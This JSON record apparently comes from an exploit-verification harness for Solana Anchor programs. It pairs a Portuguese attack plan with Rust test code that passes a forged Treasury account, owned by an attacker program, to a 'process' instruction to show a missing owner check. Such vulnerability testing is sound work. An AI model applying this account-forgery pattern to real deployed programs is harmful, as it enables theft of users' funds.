attempts.raw:
{
  "plan": "O cenário inicializa uma conta Treasury legítima via `initialize`, com authority = carteira legítima e is_active = true. O baseline chama `process` com a Treasury legítima e a authority correta, provando que o cenário está montado. O ataque chama `process` com uma conta Treasury forjada, cujo dono é o programa do atacante (ou outro programa), mantendo a authority como signer. O efeito mede se a instrução aceitou a conta forjada (sucesso) e se a conta forjada foi usada, demonstrando a falha de verificação de dono.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);

// Conta Treasury legítima (dono: env.program_id)
let treasury_legit = Pubkey::new_unique();
let treasury_data = anchor_account_data("Treasury", &(authority, 100u64, true));
let treasury_account = account(&env.program_id, &treasury_data, None);

// Conta Treasury forjada (dono: attacker_program)
let treasury_forged = Pubkey::new_unique();
let forged_data = anchor_account_data("Treasury", &(authority, 100u64, true));
let forged_account = account(&attacker_program, &forged_data, None);

// Contas para o baseline (initialize)
let authority_wallet = wallet(1_000_000_000);
let (system_program_id, system_program_account) = system_program_account();

// Baseline: initialize cria a Treasury legítima
let init_ix = env.anchor_ix(
    "initialize",
    &(100u64,),
    &[
        AccountMeta::new(treasury_legit, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let init_accounts = vec![
    (treasury_legit, empty_account()),
    (authority, authority_wallet.clone()),
    (system_program_id, system_program_account.clone()),
];
let baseline_result = env.baseline("initialize legitimo", &init_ix, &init_accounts);

// Extrair a conta Treasury criada pelo baseline
let treasury_after_init = after(&baseline_result, &treasury_legit).clone();

// Baseline: process com a Treasury legítima
let process_ix = env.anchor_ix(
    "process",
    &(),
    &[
        AccountMeta::new_readonly(treasury_legit, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let process_accounts = vec![
    (treasury_legit, treasury_after_init.clone()),
    (authority, authority_wallet.clone()),
];
let baseline_process = env.baseline("process legitimo", &process_ix, &process_accounts);

// Ataque: process com a Treasury forjada (dono diferente)
let attack_ix = env.anchor_ix(
    "process",
    &(),
    &[
        AccountMeta::new_readonly(treasury_forged, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let attack_accounts = vec![
    (treasury_forged, forged_account.clone()),
    (authority, authority_wallet.clone()),
];
let attack_result = env.attack("process com Treasury forjada", &attack_ix, &attack_accounts);

// Efeito: se o ataque teve sucesso, a conta forjada foi aceita
if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &treasury_forged);
    env.effect(
        "Treasury forjada (dono diferente) foi aceita pela instrucao process",
        forged_after.owner() == &attacker_program,
    );
}"
}

